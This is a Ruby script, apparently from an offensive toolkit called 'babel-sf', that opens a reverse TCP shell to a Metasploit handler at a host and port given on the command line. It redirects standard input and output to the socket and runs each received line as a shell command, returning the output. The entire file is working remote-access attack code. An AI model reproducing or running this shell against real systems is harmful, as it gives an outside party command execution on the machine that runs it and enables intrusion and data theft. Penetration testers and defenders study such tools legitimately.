#!/usr/bin/ruby
#
# msf-reverse_tcp.rb version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#

require 'socket'

msf_host = ARGV[0]
port_number = ARGV[1]

time = Time.now.strftime("%Y-%m-%d %H:%M")

if ARGV.empty? or ARGV[0] == "-h" or ARGV[0] == "--h" or ARGV[0] == "-help" or ARGV[0] == "--help"
    puts "msf-reverse_tcp.rb ( https://github.com/attackdebris/babel-sf )"
    puts "\r\n[This script should be utilised with a ruby/shell_reverse_tcp msf handler payload]"
    puts "\r\n"
    puts "Usage:"
    puts "ruby msf-reverse_tcp.rb [remote handler IP] [port]"
    puts "e.g. ruby msf-reverse_tcp.rb 192.168.0.1 4444"
elsif ARGV.length != 2
    puts "msf-reverse_tcp.rb ( https://github.com/attackdebris/babel-sf )"
    puts "\r\nError, 2 arguments are required, check your syntax"
elsif ARGV.length == 2
    puts "Starting msf-reverse_tcp.rb ( https://github.com/attackdebris/babel-sf ) at #{time}"
    puts "Attemping to connect to #{msf_host} on TCP port #{port_number}...."
    c=TCPSocket.new(msf_host, port_number)
    $stdin.reopen(c)
    $stdout.reopen(c)
    $stderr.reopen(c)
    $stdin.each_line{|l|l=l.strip;next if l.length==0;(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }
end